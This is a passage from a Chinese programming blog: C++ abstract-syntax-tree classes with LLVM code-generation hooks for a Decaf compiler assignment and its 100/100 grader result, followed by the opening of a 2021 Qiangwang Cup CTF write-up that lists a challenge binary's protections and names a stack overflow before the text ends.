:</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	list&lt;decafAST *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafFunCall</span>()&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;kind = dcall; </span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = funcK;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(list&lt;decafAST *&gt;  Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Para.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">list&lt;decafAST *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;MethodCall&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + commaList&lt;class decafAST *&gt;(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssign</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string Var;</span><br><span class="line">	<span class="keyword">bool</span> key;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line">	decafBinexp* Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_key</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;<span class="keyword">this</span>-&gt;key = key;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_var</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Var; &#125;</span><br><span class="line">	<span class="function">decafBinexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp; &#125;</span><br><span class="line">	<span class="built_in">decafAssign</span>(string Var, decafBinexp* Exp):<span class="built_in">Var</span>(Var),<span class="built_in">Exp</span>(Exp)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Arr == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignVar&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignArrayLoc&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Arr)+<span class="string">&quot;,&quot;</span>+ <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssignList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAssign *&gt;List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_keys</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> ass:List)&#123;</span><br><span class="line">			ass-&gt;<span class="built_in">put_key</span>(key);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> commaList&lt;class decafAssign *&gt;(List);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafAssign *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBlock</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string BloKind;</span><br><span class="line">	decafVarList *FieldDeclList;</span><br><span class="line">	decafStmts *StateDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafBlock</span>(string blokind,decafVarList *fieldlist, decafStmts *methodlist) </span><br><span class="line">		: <span class="built_in">BloKind</span>(blokind), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">StateDeclList</span>(methodlist) &#123; <span class="keyword">this</span>-&gt;kind = dblo; &#125;</span><br><span class="line">	~<span class="built_in">decafBlock</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (StateDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> StateDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> BloKind + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(StateDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara * Para;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::Type *lType;</span><br><span class="line">	llvm::Function *lfunc;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara * Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(decafType* type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;Type = type-&gt;<span class="built_in">get_type</span>();</span><br><span class="line">		<span class="keyword">this</span>-&gt;lType = type-&gt;lType;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_block</span><span class="params">(decafBlock *Block)</span></span>&#123; <span class="keyword">this</span>-&gt;Block = Block; &#125;</span><br><span class="line">	<span class="function">decafBlock *<span class="title">get_block</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Block; &#125;</span><br><span class="line">	<span class="function">decafPara *<span class="title">get_para</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Method&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFuncDefList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafFuncDef*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafFuncDef*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafFuncDefList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafFuncDef*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(decafType* Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafFuncDef *&gt;(List);&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafFuncDef *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafEXFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara* Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::Type *lType;</span><br><span class="line">	llvm::Function *lfunc;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara* Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(decafType* type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;Type = type-&gt;<span class="built_in">get_type</span>();</span><br><span class="line">		<span class="keyword">this</span>-&gt;lType = type-&gt;lType;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type; &#125;</span><br><span class="line">	<span class="function">decafPara* <span class="title">get_para</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ExternFunction&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafEXFuncDefList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafEXFuncDef*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafEXFuncDef*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafEXFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafEXFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafEXFuncDefList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafEXFuncDef*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(decafType* Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafEXFuncDef *&gt;(List);&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafEXFuncDef *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafVarList *FieldDeclList;</span><br><span class="line">	decafFuncDefList *MethodDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">PackageAST</span>(string name, decafVarList *fieldlist, decafFuncDefList *methodlist) </span><br><span class="line">		: <span class="built_in">Name</span>(name), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">MethodDeclList</span>(methodlist) &#123;&#125;</span><br><span class="line">	~<span class="built_in">PackageAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (MethodDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> MethodDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Package&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(MethodDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">		TheModule-&gt;<span class="built_in">setModuleIdentifier</span>(llvm::<span class="built_in">StringRef</span>(Name)); </span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != FieldDeclList) &#123;</span><br><span class="line">			val = FieldDeclList-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != MethodDeclList) &#123;</span><br><span class="line">			val = MethodDeclList-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="comment">// Q: should we enter the class name into the symbol table?</span></span><br><span class="line">		<span class="keyword">return</span> val; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafIF</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafBlock * Block2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafIF</span>(decafAllexp * Exp,decafBlock * Block,decafBlock * Block2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">Block2</span>(Block2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;IfStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block2) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafWhile</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafWhile</span>(decafAllexp * Exp,decafBlock * Block): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;WhileStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFor</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafAssignList *List;</span><br><span class="line">	decafAssignList *List2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafFor</span>(decafAllexp * Exp,decafBlock * Block,decafAssignList *List,decafAssignList *List2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">List</span>(List),<span class="built_in">List2</span>(List2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ForStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(List)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(List2)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafReturn</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafBinexp * Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafReturn</span>()&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;kind = dret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">decafReturn</span>(decafBinexp * Exp)&#123; </span><br><span class="line">		<span class="keyword">this</span>-&gt;Exp = Exp;</span><br><span class="line">		<span class="keyword">this</span>-&gt;kind = dret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">decafBinexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ReturnStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProgramAST - the decaf program</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProgramAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafEXFuncDefList *ExternList;</span><br><span class="line">	PackageAST *PackageDef;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">ProgramAST</span>(decafEXFuncDefList *externs, PackageAST *c) : <span class="built_in">ExternList</span>(externs), <span class="built_in">PackageDef</span>(c) &#123;&#125;</span><br><span class="line">	~<span class="built_in">ProgramAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (ExternList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> ExternList; &#125; </span><br><span class="line">		<span class="keyword">if</span> (PackageDef != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> PackageDef; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Program&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(ExternList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(PackageDef) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != ExternList) &#123;</span><br><span class="line">			val = ExternList-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != PackageDef) &#123;</span><br><span class="line">			val = PackageDef-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="built_in">runtime_error</span>(<span class="string">&quot;no package definition in decaf program&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> val; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最终拿到了满分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Correct(dev): <span class="number">100</span> / <span class="number">100</span></span><br><span class="line">Score(dev): <span class="number">100.00</span></span><br><span class="line">Total Score: <span class="number">100.00</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/03/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF2021/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/03/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF2021/" class="post-title-link" itemprop="url">强网杯CTF2021</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-07-03 17:03:05 / Modified: 17:07:22" itemprop="dateCreated datePublished" datetime="2023-07-03T17:03:05+08:00">2023-07-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>46k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>41 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="no-output"><a href="#no-output" class="headerlink" title="no_output"></a>no_output</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=<span class="number">42055570b</span>c1508252eacc21b95b83f8c002483eb, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>32位，dynamically，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>简单栈溢出</p>
